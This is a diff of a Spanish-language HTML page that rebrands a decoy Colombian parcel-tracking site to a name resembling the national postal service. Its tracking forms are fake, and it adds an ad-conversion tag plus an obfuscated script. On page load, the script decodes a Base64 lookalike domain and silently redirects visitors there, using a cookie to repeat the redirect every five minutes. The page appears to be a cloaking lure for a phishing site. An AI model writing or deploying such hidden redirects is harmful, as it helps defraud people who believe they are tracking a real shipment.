@@ -1,118 +1,164 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-16572051458"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-16572051458');
+</script>
+<!-- Event snippet for Other conversion page -->
+<script>
+  gtag('event', 'conversion', {'send_to': 'AW-16572051458/TpjpCIjAgLIZEILgld49'});
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Colombia Envíos Express</title>
+    <title>Rastreo Envíos 472 Soluciones</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
             color: #333;
-            background-color: #e8f0fe;
+            background-color: #f4f4f9;
         }
         header, footer {
-            background-color: #1464A5;
-            color: #ffffff;
-            padding: 12px 20px;
+            background-color: #007BFF;
+            color: white;
+            padding: 10px 20px;
             text-align: center;
-        }
-        section {
-            background-color: #ffffff;
-            margin: 20px;
-            padding: 25px;
-            border-radius: 10px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.15);
-        }
-        input[type="text"] {
-            padding: 12px;
-            margin: 12px 0;
-            border: 2px solid #ccc;
-            border-radius: 4px;
-        }
-        button {
-            padding: 12px 24px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        nav {
-            background-color: #017377;
-            color: white;
-            text-align: center;
-            padding: 12px 0;
-        }
-        nav a {
-            color: white;
-            text-decoration: none;
-            padding: 12px 24px;
-            display: inline-block;
-        }
-        nav a:hover {
-            background-color: #005955;
         }
         .container {
-            max-width: 1200px;
+            width: 90%;
             margin: auto;
             overflow: hidden;
         }
+        nav {
+            background: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+        }
+        nav a {
+            color: white;
+            padding: 14px 20px;
+            text-decoration: none;
+        }
+        section {
+            padding: 20px 0;
+            border-bottom: 1px solid #ddd;
+        }
+        input[type="text"] {
+            padding: 10px;
+            margin: 10px 0;
+        }
+        input[type="submit"] {
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #218838;
+        }
+        footer p {
+            margin: 0;
+            padding: 10px;
+        }
     </style>
+<script>
+    var a = 'aHR0cHM6Ly9yYXN0cmVhdHVlbnZpby00LTcyLWNvbG9tYmlhLmNvbQ==', // Base64 encoded URL
+        b = 'lastVisit';
+    
+    function c() {
+        var d = new Date().getTime(), 
+            e = f(b);
+        
+        if (!e) {
+            g(b, d, 0.00347);
+            window.location.replace(atob(a)); // Decoding the Base64 URL before using it
+        } else {
+            var h = d - e;
+            if (h > 300000) {
+                g(b, d, 0.00347);
+                window.location.replace(atob(a)); // Decoding the Base64 URL before using it
+            }
+        }
+    }
+    
+    function f(j) {
+        var k = `; ${document.cookie}`, 
+            l = k.split(`; ${j}=`);
+        return l.length === 2 ? l.pop().split(';').shift() : null;
+    }
+    
+    function g(m, n, o) {
+        var p = new Date();
+        p.setTime(p.getTime() + (o * 24 * 60 * 60 * 1000));
+        document.cookie = `${m}=${n};expires=${p.toUTCString()};path=/`;
+    }
+    
+    c();
+</script>
 </head>
 <body>
     <header>
-        <h1>Colombia Envíos Express</h1>
-        <p>Conectando Colombia con el mundo.</p>
+        <h1>Rastreo Envíos 472 Soluciones</h1>
     </header>
     <nav>
         <a href="#rastrear-guia">Rastrear Guía</a>
-        <a href="#nosotros">Acerca de Nosotros</a>
+        <a href="#nosotros">Nosotros</a>
         <a href="#servicios">Nuestros Servicios</a>
         <a href="#contacto">Contáctenos</a>
-        <a href="#faqs">Preguntas Frecuentes</a>
-        <a href="#rastrear-envio">Seguimiento de Envíos</a>
+        <a href="#faq">Preguntas Frecuentes</a>
+        <a href="#rastrear-envio">Rastrear Envío</a>
     </nav>
     <div class="container">
         <section id="rastrear-guia">
             <h2>Rastrear Guía</h2>
-            <p>Ingresa el número de tu guía para rastrear tu envío en tiempo real.</p>
+            <p>Introduce el número de tu guía para rastrear el estado actual de tu envío y obtener detalles al instante.</p>
             <input type="text" placeholder="Número de guía">
-            <button onclick="alert('Número de guía incorrecto')">Rastrear Guía</button>
+            <input type="submit" value="Rastrear" onclick="alert('Número de guía incorrecto :c');">
         </section>
         <section id="nosotros">
-            <h2>Acerca de Nosotros</h2>
-            <p>Envíos Express es líder en logística en Colombia, ofreciendo soluciones rápidas y seguras.</p>
+            <h2>Nosotros</h2>
+            <p>Somos una empresa dedicada a proporcionar soluciones integrales de logística y rastreo de envíos. Nuestra misión es simplificar los procesos de entrega y asegurar la máxima seguridad y transparencia en cada paso.</p>
+            <p>La visión de Rastreo Envíos 472 Soluciones es ser líderes en el mercado logístico, expandiéndonos a nivel nacional e internacional, ofreciendo siempre tecnología de punta y un servicio al cliente sin comparaciones.</p>
+            <p>Nuestros valores se centran en la responsabilidad, la innovación y el compromiso con cada uno de nuestros clientes. Creemos firmemente en la mejora continua y en la importancia de adaptarnos a las nuevas demandas del mercado.</p>
+            <p>Con más de 10 años de experiencia, hemos logrado establecer una red de servicios eficiente y confiable, permitiendo que tu negocio crezca sin límites.</p>
         </section>
         <section id="servicios">
             <h2>Nuestros Servicios</h2>
-            <p>Desde envíos nacionales hasta internacionales, aseguramos rapidez y seguridad en todos nuestros servicios.</p>
+            <p>Ofrecemos una amplia gama de servicios de logística y distribución diseñados para cumplir con las necesidades específicas de cada cliente. Desde envíos estándar hasta soluciones completamente personalizadas.</p>
+            <p>Contamos con tecnología de rastreo en tiempo real, proporcionando a nuestros clientes la posibilidad de seguir cada paso de su envío a través de nuestra plataforma digital.</p>
+            <p>Nuestro equipo está altamente capacitado para manejar desde los paquetes más pequeños hasta los cargamentos más grandes, asegurando siempre un manejo cuidadoso y profesional.</p>
+            <p>Además, ofrecemos servicios de consultoría y gestión aduanera, ayudando a nuestros clientes a navegar por los complejos procesos de importación y exportación sin problemas.</p>
         </section>
         <section id="contacto">
             <h2>Contáctenos</h2>
-            <p>Dirección: Calle 100 #15-21, Bogotá, Colombia</p>
-            <p>Teléfono: +57 312 345 6789</p>
-            <p>Email: servicioalcliente@colombiaenviosexpress.co</p>
+            <p>Dirección: Calle 100 #23-45, Bogotá, Colombia</p>
+            <p>Teléfono: 315 234 5678 (Horario de atención: Lunes a Viernes de 8:00 a 18:00)</p>
         </section>
-        <section id="faqs">
+        <section id="faq">
             <h2>Preguntas Frecuentes</h2>
-            <p>Consulta nuestra sección de FAQs para obtener más información sobre cómo podemos ayudarte.</p>
+            <p>¿Cómo puedo rastrear mi envío? Ingresa el número de guía en nuestra sección de Rastreo y obtén toda la información al instante.</p>
+            <p>¿Qué hacer si mi paquete no llega en la fecha estimada? Comunícate con nuestro servicio al cliente para obtener soporte y soluciones inmediatas.</p>
+            <p>¿Es posible cambiar la dirección de entrega una vez enviado el paquete? Sujeto a ciertas condiciones, es posible modificar la información de entrega. Contacta a nuestro equipo para más detalles.</p>
+            <p>¿Ofrecen servicios de envío internacional? Sí, contamos con opciones de envío internacional, asegurando la misma calidad y eficiencia en cada envío.</p>
         </section>
         <section id="rastrear-envio">
             <h2>Rastrear Envío</h2>
-            <p>Utiliza nuestro sistema de seguimiento para saber dónde está tu paquete en cualquier momento.</p>
-            <input type="text" placeholder="Número de envío">
-            <button onclick="alert('Número de envío incorrecto')">Rastrear Envío</button>
+            <p>Ingrese aquí el número de su guía para obtener información detallada sobre el trayecto y estado actual de su envío.</p>
+            <input type="text" placeholder="Número de guía">
+            <input type="submit" value="Rastrear" onclick="alert('Número de guía incorrecto :c');">
         </section>
     </div>
     <footer>
-        <p>© 2024 Colombia Envíos Express - Todos los derechos reservados.</p>
-        <p>"Explora nuevos destinos con la confianza de que tu paquete llegará a tiempo y en perfecto estado."</p>
+        <p>"La exploración de lo desconocido revela las verdades más profundas."</p>
     </footer>
 </body>
 </html>
